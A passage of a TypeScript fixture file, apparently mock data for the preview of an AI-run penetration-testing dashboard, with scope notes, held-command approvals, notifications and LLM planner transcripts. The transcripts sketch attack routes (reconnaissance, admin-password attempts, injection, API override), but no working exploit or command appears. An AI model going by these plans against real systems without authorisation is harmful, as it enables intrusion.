              ? ["northwind.example", "www.northwind.example", "mail.northwind.example", "198.51.100.0/24"]
              : [];
  return [
    `# ${task?.name ?? taskId}`,
    "",
    task?.goal ?? "",
    "",
    "## In scope",
    "",
    ...hosts.map((host) => `- ${host}`),
    "",
    "This preview did not send a request.",
  ].join("\n");
}

function acmeAssetsNote(): string {
  const hosts = [
    ...new Set(
      assets
        .filter((asset) => asset.company_id === 1)
        .flatMap((asset) => [asset.domain, asset.ip].filter((value): value is string => Boolean(value))),
    ),
  ];
  return [
    "# Assets",
    "",
    "Hosts already recorded for Acme.",
    "",
    ...hosts.map((host) => `- ${host}`),
    "",
    "This preview did not send a request.",
  ].join("\n");
}

function evidenceIndex(): string {
  const lines = ["# Evidence", "", "Finding id and the traffic id bound to it.", ""];
  for (const finding of findings) {
    if (finding.task_id !== ACTIVE_TASK) continue;
    const ids = (findingTrafficSeeds[finding.id] ?? []).map((seed) => seed.traffic_id);
    lines.push(`- ${finding.id}: ${ids.join(", ") || "none"}`);
  }
  return lines.join("\n");
}

type WsNode = { name: string; dir: boolean; size: number; content?: string };

function fileNode(path: string, name: string, content: string): WsNode {
  rememberFile(path, content);
  return { name, dir: false, size: new TextEncoder().encode(content).length, content };
}

const WS_TREE: Record<string, WsNode[]> = {
  "": tasks.map((task) => ({ name: task.id, dir: true, size: 0 })),
  [ACTIVE_TASK]: [
    fileNode(`${ACTIVE_TASK}/scope.md`, "scope.md", scopeNote(ACTIVE_TASK)),
    fileNode(`${ACTIVE_TASK}/assets.md`, "assets.md", acmeAssetsNote()),
    { name: "evidence", dir: true, size: 0 },
  ],
  [`${ACTIVE_TASK}/evidence`]: [fileNode(`${ACTIVE_TASK}/evidence/index.md`, "index.md", evidenceIndex())],
};

for (const task of tasks) {
  if (task.id === ACTIVE_TASK) continue;
  WS_TREE[task.id] = [fileNode(`${task.id}/scope.md`, "scope.md", scopeNote(task.id))];
}

const wsClean = (p: string) => p.replace(/^\/+|\/+$/g, "");

export function workspaceList(path: string) {
  const key = wsClean(path);
  const items = WS_TREE[key] ?? [];
  const now = Date.parse(T("2026-10-12T02:23:55Z"));
  return {
    path: key,
    entries: items.map((it, i) => ({
      name: it.name,
      path: key ? `${key}/${it.name}` : it.name,
      dir: it.dir,
      size: it.size,
      mtime: now - i * 3_600_000,
    })),
  };
}

export function workspaceRead(path: string) {
  const key = wsClean(path);
  const content = WS_FILES[key] ?? "";
  return { path: key, size: new TextEncoder().encode(content).length, binary: false, content };
}

// Held command text is PAYMENT_HELD_COMMAND, shared with the pending intercept.

// ── Tool execution history (/commands) ──
export const commandRecords = [
  {
    id: 1,
    exploration_id: 1,
    task_id: "t-acme-web",
    worker: "work#1",
    tool: "bash",
    command: JSON.stringify({ command: "Read the recorded response headers for the in-scope site." }),
    output: "The stored response named nginx and an administration login page.",
    is_error: false,
    created_at: T("2026-09-29T05:43:58Z"),
  },
  {
    id: 2,
    exploration_id: 1,
    task_id: "t-acme-web",
    worker: "work#1",
    tool: "bash",
    command: JSON.stringify({ command: "List the hosts already recorded for acme.com." }),
    output: "The fixture lists www, admin, api, shop, and vpn.",
    is_error: false,
    created_at: T("2026-09-29T05:46:07Z"),
  },
  {
    id: 3,
    exploration_id: 1,
    task_id: "t-acme-web",
    worker: "work#1",
    tool: "upsert_asset",
    command: JSON.stringify({ command: "Record the hosts that answered." }),
    output: "Six host records were already in the asset list.",
    is_error: false,
    created_at: T("2026-09-29T05:46:16Z"),
  },
  {
    id: 4,
    exploration_id: 1,
    task_id: "t-acme-web",
    worker: "planner",
    tool: "bash",
    command: JSON.stringify({ command: "Open the recorded search exchange." }),
    output: "The stored search response is an HTML page. This preview did not send a request.",
    is_error: false,
    created_at: T("2026-09-30T00:46:26Z"),
  },
  {
    id: 5,
    exploration_id: 1,
    task_id: "t-acme-web",
    worker: "work#1",
    tool: "bash",
    command: JSON.stringify({ command: "Open the recorded administration sign-in." }),
    output: "The preview did not run the command.",
    is_error: true,
    created_at: T("2026-09-30T01:57:54Z"),
  },
  {
    id: 6,
    exploration_id: 3,
    task_id: "t-shop-pay",
    worker: "work#2",
    tool: "bash",
    command: JSON.stringify({ command: PAYMENT_HELD_COMMAND }),
    output: "The command is held for approval on task t-shop-pay for finding f-10. This preview did not run it.",
    is_error: false,
    created_at: T("2026-10-09T02:23:55Z"),
  },
];

// ── LLM Recording (/llm/records, /llm/records/{id}) ──
// Prompt and reply text is copied from the task session. It is not a new procedure.
const llmTranscripts: Record<number, { prompt: string; reply: string }> = {
  1: {
    prompt: "Round 0 · Target Teardown",
    reply:
      "The first batch of 4 intentions were derived in this round: i1 asset reconnaissance, i2 background password, i4 injection, and i5 API override. g1 goes to i2, g2 goes to i4/i5, and each of the two goals has an independent entrance to advance. Wait for the worker to produce the facts and then increase the weight based on blood.",
  },
  2: {
    prompt: "First passively reconnaissance subdomains, and then perform port/service identification on surviving hosts.",
    reply: "5 surviving subdomains, where admin is the background login page.",
  },
  3: {
    prompt: "Open 22/80/443.",
    reply:
      "admin is an independent backend login page; confirm that the five entrances are valid and accurately describe the initial intention.",
  },
  4: {
    prompt:
      "The starting situation is almost blank. Do ≤3 read-only detections to calibrate the initial intention direction (without enumeration/verification, that is the job of the worker).",
    reply:
      "Deliberately keep the routes diverse: i1 reconnaissance + i2 (g1 certification route) + i4/i5 (g2 data route), 2 independent mechanisms run in parallel without premature convergence.",
  },
};

export const llmRecords = [
  {
    id: 1,
    ts: T("2026-09-29T05:39:38Z"),
    model: "claude-opus-4-8",
    profile_name: "Claude Opus 4.8",
    session_id: "planner",
    task_id: "t-acme-web",
    worker: "planner",
    latency_ms: 3210,
    input_tokens: 8421,
    output_tokens: 512,
    cache_read: 6000,
    cache_write: 1200,
    status: "ok",
  },
  {
    id: 2,
    ts: T("2026-09-29T05:43:10Z"),
    model: "claude-opus-4-8",
    profile_name: "Claude Opus 4.8",
    session_id: "i1",
    task_id: "t-acme-web",
    worker: "work#1",
    latency_ms: 4180,
    input_tokens: 12044,
    output_tokens: 733,
    cache_read: 9000,
    cache_write: 1500,
    status: "ok",
  },
  {
    id: 3,
    ts: T("2026-09-29T05:46:07Z"),
    model: "claude-opus-4-8",
    profile_name: "Claude Opus 4.8",
    session_id: "i1",
    task_id: "t-acme-web",
    worker: "work#1",
    latency_ms: 2890,
    input_tokens: 7311,
    output_tokens: 421,
    cache_read: 5200,
    cache_write: 900,
    status: "ok",
  },
  {
    id: 4,
    ts: T("2026-09-29T05:39:32Z"),
    model: "claude-opus-4-8",
    profile_name: "Claude Opus 4.8",
    session_id: "planner",
    task_id: "t-acme-web",
    worker: "planner",
    latency_ms: 900,
    input_tokens: 7600,
    output_tokens: 0,
    cache_read: 5200,
    cache_write: 0,
    status: "error",
    error: "The preview recorded an error for this call and did not retry it.",
  },
];

const llmTaskCounts: Record<string, number> = {};
for (const r of llmRecords) if (r.task_id) llmTaskCounts[r.task_id] = (llmTaskCounts[r.task_id] ?? 0) + 1;
export const llmTasks: LLMTask[] = Object.entries(llmTaskCounts).map(([task_id, count]) => ({ task_id, count }));

export function llmRecordDetail(id: number, records = llmRecords) {
  const item = records.find((r) => r.id === id);
  if (!item) {
    return {
      id,
      ts: "",
      model: "",
      profile_name: "",
      session_id: "",
      task_id: "",
      worker: "",
      latency_ms: 0,
      input_tokens: 0,
      output_tokens: 0,
      cache_read: 0,
      cache_write: 0,
      status: "missing",
      request_body: "",
      response_body: "",
      raw_request: "",
      raw_response: "",
    };
  }
  const transcript = llmTranscripts[item.id] ?? { prompt: "", reply: "" };
  return {
    ...item,
    request_body: JSON.stringify(
      {
        model: item.model,
        messages: [{ role: "user", content: transcript.prompt }],
      },
      null,
      2,
    ),
    response_body: JSON.stringify(
      {
        stop_reason: item.status === "error" ? "error" : "end_turn",
        content: [{ type: "text", text: transcript.reply }],
        usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
      },
      null,
      2,
    ),
    raw_request: JSON.stringify({ model: item.model, messages: [{ role: "user", content: transcript.prompt }] }),
    raw_response: transcript.reply,
  };
}

export const notifyChannels = [
  {
    id: 1,
    name: "Campaign webhook",
    kind: "webhook",
    enabled: true,
    mode: "realtime" as const,
    config: {
      url: "https://example.invalid/hooks/artex",
      method: "POST",
      headers: "__masked__:…artex",
    },
    filter: { min_severity: "low" },
    rate_per_min: 0,
    created_at: T("2026-09-29T05:39:12Z"),
    updated_at: T("2026-10-10T02:23:55Z"),
    secret_keys: ["headers"],
  },
];

export const notifyDeliveries = [
  {
    id: 1,
    finding_id: "f-12",
    event_kind: "finding_created",
    channel_id: 1,
    channel_name: "Campaign webhook",
    channel_kind: "webhook",
    state: "sent" as const,
    attempts: 1,
    last_error: "",
    created_at: T("2026-09-29T20:10:05Z"),
    sent_at: T("2026-09-29T20:10:06Z"),
    next_attempt_at: T("2026-09-29T20:10:06Z"),
    title: "Critical finding f-12 on task t-acme-web delivered",
    severity: "critical",
  },
  {
    id: 2,
    finding_id: "f-2",
    event_kind: "finding_created",
    channel_id: 1,
    channel_name: "Campaign webhook",
    channel_kind: "webhook",
    state: "sent" as const,
    attempts: 1,
    last_error: "",
    batch_id: 7,
    created_at: T("2026-09-30T01:26:28Z"),
    sent_at: T("2026-10-10T02:23:55Z"),
    next_attempt_at: T("2026-10-10T02:23:55Z"),
    title: "High finding f-2 on task t-acme-api batched into a digest",
    severity: "high",
  },
  {
    id: 3,
    finding_id: "f-10",
    event_kind: "finding_created",
    channel_id: 1,
    channel_name: "Campaign webhook",
    channel_kind: "webhook",
    state: "failed" as const,
    attempts: 1,
    last_error: "preview endpoint refused the connection",
    created_at: T("2026-09-28T20:58:50Z"),
    next_attempt_at: T("2026-10-09T02:23:55Z"),
    title: "Finding f-10 on task t-shop-pay was not delivered",
    severity: "medium",
  },
];

export const campaignLogs = [
  {
    seq: 1,
    db_id: 1,
    ts: T("2026-10-06T02:23:55Z"),
    level: "info" as const,
    tag: "task",
    text: "Task t-acme-web started. Finding f-1 is part of this campaign.",
  },
  {
    seq: 2,
    db_id: 2,
    ts: T("2026-09-30T00:46:26Z"),
    level: "info" as const,
    tag: "finding",
    text: "Finding f-1 recorded on task t-acme-web.",
  },
  {
    seq: 3,
    db_id: 3,
    ts: T("2026-10-09T02:23:55Z"),
    level: "warn" as const,
    tag: "intercept",
    text: "Intercept held on task t-shop-pay for finding f-10.",
  },
  {
    seq: 4,
    db_id: 4,
    ts: T("2026-10-10T02:23:55Z"),
    level: "info" as const,
    tag: "notify",
    text: "Digest sent for finding f-2 on task t-acme-api.",
  },
];
